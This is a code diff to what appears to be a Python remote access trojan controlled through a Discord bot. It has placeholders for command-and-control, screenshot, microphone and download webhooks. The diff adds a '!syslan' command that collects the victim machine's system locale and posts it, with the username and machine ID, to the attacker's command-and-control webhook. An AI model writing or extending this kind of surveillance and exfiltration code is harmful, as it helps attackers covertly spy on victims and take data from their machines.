@@ -2,6 +2,7 @@
 
 
 ### Imports
+import locale
 import pyperclip
 from pynput.keyboard import Key, Controller
 from tkinter import messagebox
@@ -65,6 +66,7 @@ if not os.path.exists(path_install):
 else:
     pass
 
+#values to run.
 AGENT_ONLINE_ID = "[AGENT_ONLINE_WBHOOK]"
 COMMAND_CONTROL_ID = "[C2_WEBHOOK]" 
 SCREENSHOT_ID = "[SCREENSHOT_WEBHOOK]"
@@ -73,6 +75,7 @@ MIC_ID = "[MICROPHONE_WEBHOOK]"
 DOWNLOAD_ID = "[DOWNLOAD_WEBHOOK]"
 BOT_TOKEN = "[BOT_TOKEN_HERE]"
 
+#
 version = "v1.0.0"
 author = "Vczz0"
 github_link = "https://github.com/Vczz0"
@@ -1609,4 +1612,22 @@ async def remove(ctx):
             webhook.add_embed(embed) 
             response = webhook.execute()
 
-bot.run(BOT_TOKEN)
+@bot.command(name="syslan", pass_ctx=True)
+async def remove(ctx):
+    command = ctx.message.content.replace("!syslan", "")
+    check_id = command.split()
+    if int(check_id[0]) == int(ID):
+        try:
+            lan = locale.getdefaultlocale()
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Successfull got sys lan from : {usr} #{ID}**", description=f"{lan}", color='09e30d')
+            webhook.add_embed(embed)
+            response = webhook.execute()
+        except Exception as e:
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Failed to get sys lan: {usr} #{ID}**", description=f"{e}", color='ff0000')
+            webhook.add_embed(embed) 
+            response = webhook.execute()
+
+bot.run(BOT_TOKEN) #run bot
+
